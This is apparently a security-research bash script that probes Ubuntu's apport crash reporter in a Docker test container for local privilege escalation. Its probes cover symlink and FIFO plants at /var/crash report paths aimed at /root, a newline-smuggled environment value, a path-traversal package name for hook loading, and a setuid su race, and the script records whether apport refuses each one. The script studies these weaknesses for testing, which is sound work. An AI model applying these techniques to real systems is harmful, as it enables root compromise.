#!/usr/bin/env bash
set -Eeuo pipefail

container="${CONTAINER:-ubuntu24-server-lpe-target}"
attacker="${ATTACKER_USER:-attacker}"

section() {
  printf '\n== %s ==\n' "$*"
}

section "target and default apport state"
docker exec "$container" bash -lc '
set -u
cat /etc/os-release | sed -n "1,8p"
uname -a
id "'"$attacker"'" || true
groups "'"$attacker"'" || true
echo "-- packages"
for p in apport apport-core-dump-handler apport-symptoms python3-apport python3-problem-report systemd systemd-coredump whoopsie; do
  dpkg-query -W -f="\${Package}\t\${Version}\t\${db:Status-Abbrev}\n" "$p" 2>/dev/null || echo "$p	<not-installed>"
done
echo "-- sysctls"
sysctl kernel.core_pattern fs.suid_dumpable kernel.core_pipe_limit kernel.core_uses_pid 2>/dev/null || true
echo "-- paths"
for p in /var/crash /var/lib/apport /var/lib/apport/coredump /var/lib/apport/autoreport /run/apport.socket /usr/bin/whoopsie; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -c "%F %A %a %U %G %s %N" "$p"
  else
    echo "MISSING $p"
  fi
done
echo "-- unit files"
systemctl list-unit-files "apport*" "whoopsie*" "systemd-coredump*" --no-pager || true
echo "-- sockets"
systemctl list-sockets --all --no-pager | grep -Ei "apport|whoops|coredump" || true
echo "-- timers"
systemctl list-timers --all --no-pager | grep -Ei "apport|whoops|coredump" || true
'

section "apport unit definitions"
docker exec "$container" bash -lc '
for f in \
  /usr/lib/systemd/system/apport.service \
  /usr/lib/systemd/system/apport-forward.socket \
  /usr/lib/systemd/system/apport-forward@.service \
  /usr/lib/systemd/system/apport-autoreport.path \
  /usr/lib/systemd/system/apport-autoreport.timer \
  /usr/lib/systemd/system/apport-autoreport.service \
  /usr/lib/systemd/system/apport-coredump-hook@.service
do
  echo "### $f"
  sed -n "1,180p" "$f" 2>&1 || true
done
'

section "bounded live trust-boundary probes"
docker exec -i -e ATTACKER_USER="$attacker" "$container" bash <<'TARGET'
set -Eeuo pipefail

attacker="${ATTACKER_USER:-attacker}"
uid="$(id -u "$attacker")"
gid="$(id -g "$attacker")"
work="$(mktemp -d /tmp/apport-second-pass.XXXXXX)"

py_report="/var/crash/_usr_bin_python3.${uid}.crash"
sleep_report="/var/crash/_usr_bin_sleep.${uid}.crash"
su_report="/var/crash/_usr_bin_su.${uid}.crash"
fake_report="/var/crash/apport_sp_fake.${uid}.crash"
bad_hook_report="/var/crash/apport_sp_hook_bad.${uid}.crash"
py_marker="/root/apport_sp_py_symlink_target"
su_marker="/root/apport_sp_su_symlink_target"
hook_marker="/root/apport_sp_hook_marker"
pids=()

stat_path() {
  for p in "$@"; do
    if [ -e "$p" ] || [ -L "$p" ]; then
      stat -c "%F %A %a %U %G %s %N" "$p"
    else
      echo "MISSING $p"
    fi
  done
}

run_cmd() {
  echo "+ $*"
  set +e
  "$@" 2>&1
  local rc=$?
  set -e
  echo "rc=$rc"
}

run_shell() {
  echo "+ $*"
  set +e
  bash -lc "$*" 2>&1
  local rc=$?
  set -e
  echo "rc=$rc"
}

as_attacker() {
  echo "+ as ${attacker}: $*"
  set +e
  setpriv --reuid="$uid" --regid="$gid" --clear-groups "$@" 2>&1
  local rc=$?
  set -e
  echo "rc=$rc"
}

as_attacker_shell() {
  echo "+ as ${attacker}: $*"
  set +e
  setpriv --reuid="$uid" --regid="$gid" --clear-groups /bin/bash -c "$*" 2>&1
  local rc=$?
  set -e
  echo "rc=$rc"
}

run_apport_stdin() {
  local payload="$1"
  shift
  echo "+ printf payload | /usr/share/apport/apport $*"
  set +e
  printf "%s" "$payload" | /usr/share/apport/apport "$@" 2>&1 | sed -n "1,40p"
  local rc=${PIPESTATUS[1]}
  set -e
  echo "rc=$rc"
}

show_report_keys() {
  local report="$1"
  if [ ! -f "$report" ]; then
    echo "MISSING report $report"
    return
  fi
  python3 - "$report" <<'PY'
import sys
from problem_report import ProblemReport

report = ProblemReport()
with open(sys.argv[1], "rb") as f:
    report.load(f, binary="compressed")
for key in (
    "ProblemType",
    "ExecutablePath",
    "InterpreterPath",
    "Package",
    "SourcePackage",
    "Signal",
    "ProcCmdline",
    "ProcCwd",
    "ProcEnviron",
    "UserGroups",
):
    print(f"{key}: {report.get(key, '<missing>')!r}")
PY
}

cleanup() {
  set +e
  for pid in "${pids[@]}"; do
    kill "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
  done
  rm -rf "$work"
  for p in "$py_report" "$sleep_report" "$su_report" "$fake_report" "$bad_hook_report"; do
    rm -f "$p" "${p%.crash}.upload" "${p%.crash}.uploaded" "${p%.crash}".*.hanging
  done
  rm -f "$py_marker" "$su_marker" "$hook_marker"
}
trap cleanup EXIT

cleanup
mkdir -p "$work"
chmod 755 "$work"

echo "-- attacker identity"
id "$attacker"
getent passwd "$attacker"

echo "-- normal user default crash path with core_pattern=core"
core_dir="$work/default-core"
install -d -m 700 -o "$uid" -g "$gid" "$core_dir"
as_attacker /bin/bash -c 'cd "$1"; ulimit -c unlimited; rm -f core core.*; /bin/bash -c "kill -SEGV \$\$"; rc=$?; echo "crash_rc=$rc"; ls -la "$1"' bash "$core_dir"
stat_path "/var/crash/_usr_bin_bash.${uid}.crash"

echo "-- attacker writable /var/crash and direct uploader path"
as_attacker_shell "printf 'ProblemType: Crash\nExecutablePath: /usr/bin/python3\nPackage: python3 3.12\nDate: Sat May 16 00:00:00 2026\n' > '$fake_report'; touch '${fake_report%.crash}.upload'; stat -c '%F %A %a %U %G %s %N' '$fake_report' '${fake_report%.crash}.upload'; /usr/share/apport/whoopsie-upload-all --timeout 0"

echo "-- apport-forward socket normal-user reachability"
stat_path /run/apport.socket
as_attacker python3 - <<'PY'
import os
import socket

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect("/run/apport.socket")
    print("connect=OK unexpected")
except OSError as exc:
    print(f"connect=FAIL errno={exc.errno} {os.strerror(exc.errno)}")
finally:
    s.close()
PY

echo "-- autoreport path/timer consumption gates"
stat_path /var/lib/apport /var/lib/apport/autoreport /usr/bin/whoopsie
as_attacker_shell "touch /var/lib/apport/autoreport"
as_attacker timeout 5 systemctl start apport-autoreport.service
run_cmd systemctl start apport-autoreport.service
run_cmd systemctl status apport-autoreport.path apport-autoreport.timer apport-autoreport.service --no-pager
run_cmd /usr/share/apport/whoopsie-upload-all --timeout 0

echo "-- package hook import boundary"
find /usr/share/apport/package-hooks /etc/apport -maxdepth 2 -type f -printf "%m %u %g %p\n" 2>/dev/null | sort | sed -n "1,80p"
cat > "$work/apport_sp_hookpkg.py" <<'PY'
def add_info(report, ui):
    open("/root/apport_sp_hook_marker", "w", encoding="utf-8").write("hook ran\n")
PY
python3 - "$work/apport_sp_hookpkg.py" <<'PY'
import os
import sys
from apport.report import Report

marker = "/root/apport_sp_hook_marker"
local_hook = sys.argv[1]
print(f"local_tmp_hook={local_hook}")

r = Report("Crash")
r["ExecutablePath"] = "/usr/bin/python3"
r["Package"] = "apport_sp_hookpkg 1"
r["SourcePackage"] = "apport_sp_hookpkg"
print("local_tmp_package_hook_result", r.add_hooks_info())
print("local_tmp_hook_marker_exists", os.path.exists(marker))

r2 = Report("Crash")
r2["ExecutablePath"] = "/usr/bin/python3"
r2["Package"] = "../../tmp/apport_sp_hookpkg 1"
r2["SourcePackage"] = "../../tmp/apport_sp_hookpkg"
print("slash_package_hook_result", r2.add_hooks_info())
print("slash_package_unreportable", r2.get("UnreportableReason", "<missing>"))
print("slash_hook_marker_exists", os.path.exists(marker))
PY
stat_path "$hook_marker"

echo "-- crafted process name/environment/cwd and symlink report refusal"
mkdir -p "$work/real-cwd"
ln -s "$work/real-cwd" "$work/cwd-link"
cat > "$work/start_py.sh" <<'SH'
#!/usr/bin/env bash
cd "$1"
export LD_PRELOAD=/tmp/apport_sp_missing.so
export LOCPATH=$'bad\nInjected: yes'
export PATH=/tmp/apport_sp_path:/usr/bin:/bin
exec /usr/bin/python3 -c 'import ctypes, time; ctypes.CDLL(None).prctl(15, b"ap) 999", 0, 0, 0); time.sleep(60)'
SH
chmod 755 "$work/start_py.sh"
setpriv --reuid="$uid" --regid="$gid" --clear-groups "$work/start_py.sh" "$work/cwd-link" >"$work/py.out" 2>"$work/py.err" &
py_pid=$!
pids+=("$py_pid")
sleep 0.5
echo "py_pid=$py_pid"
readlink "/proc/$py_pid/exe" || true
head -n 5 "/proc/$py_pid/status" || true
as_attacker_shell "ln -s '$py_marker' '$py_report'; stat -c '%F %A %a %U %G %s %N' '$py_report'"
run_apport_stdin "COREPY" -p "$py_pid" -s 11 -c 0 -d 1 -P "$py_pid" -u "$uid" -g "$gid"
stat_path "$py_report" "$py_marker"
rm -f "$py_report"
run_apport_stdin "COREPY2" -p "$py_pid" -s 11 -c 0 -d 1 -P "$py_pid" -u "$uid" -g "$gid"
stat_path "$py_report"
show_report_keys "$py_report"

echo "-- executable symlink and FIFO report path race"
ln -s /usr/bin/sleep "$work/sleep-link"
setpriv --reuid="$uid" --regid="$gid" --clear-groups "$work/sleep-link" 60 &
sleep_pid=$!
pids+=("$sleep_pid")
sleep 0.3
echo "sleep_pid=$sleep_pid"
readlink "/proc/$sleep_pid/exe" || true
as_attacker_shell "mkfifo '$sleep_report'; stat -c '%F %A %a %U %G %s %N' '$sleep_report'"
run_apport_stdin "CORESLEEP" -p "$sleep_pid" -s 11 -c 0 -d 1 -P "$sleep_pid" -u "$uid" -g "$gid"
stat_path "$sleep_report"
show_report_keys "$sleep_report"

echo "-- setuid dump-mode root-owned report and symlink refusal"
mkfifo "$work/su-in"
chmod 666 "$work/su-in"
python3 - "$work/su-in" <<'PY' &
import os
import sys
import time

fd = os.open(sys.argv[1], os.O_RDWR | os.O_NONBLOCK)
time.sleep(60)
os.close(fd)
PY
fifo_holder=$!
pids+=("$fifo_holder")
setpriv --reuid="$uid" --regid="$gid" --clear-groups /usr/bin/su root <"$work/su-in" >"$work/su.out" 2>&1 &
su_pid=$!
pids+=("$su_pid")
sleep 0.7
echo "su_pid=$su_pid"
ps -o pid,user,ruser,euser,ruid,euid,stat,comm -p "$su_pid" || true
as_attacker_shell "ln -s '$su_marker' '$su_report'; stat -c '%F %A %a %U %G %s %N' '$su_report'"
run_apport_stdin "CORESU" -p "$su_pid" -s 11 -c 0 -d 2 -P "$su_pid" -u "$uid" -g "$gid"
stat_path "$su_report" "$su_marker"
rm -f "$su_report"
run_apport_stdin "CORESU2" -p "$su_pid" -s 11 -c 0 -d 2 -P "$su_pid" -u "$uid" -g "$gid"
stat_path "$su_report"
show_report_keys "$su_report"

echo "-- cleanup preview before trap"
find /var/crash -maxdepth 1 \( -name "apport_sp_*" -o -name "_usr_bin_python3.${uid}.crash" -o -name "_usr_bin_sleep.${uid}.crash" -o -name "_usr_bin_su.${uid}.crash" \) -printf "%M %u %g %s %p -> %l\n" | sort || true
TARGET

section "post-cleanup health"
docker exec "$container" bash -lc '
echo "-- generated apport second-pass crash files"
find /var/crash -maxdepth 1 \( -name "apport_sp_*" -o -name "_usr_bin_python3.*.crash" -o -name "_usr_bin_sleep.*.crash" -o -name "_usr_bin_su.*.crash" \) -printf "%M %u %g %s %p -> %l\n" | sort || true
echo "-- systemd state"
systemctl is-system-running --no-pager || true
systemctl --failed --no-pager || true
'
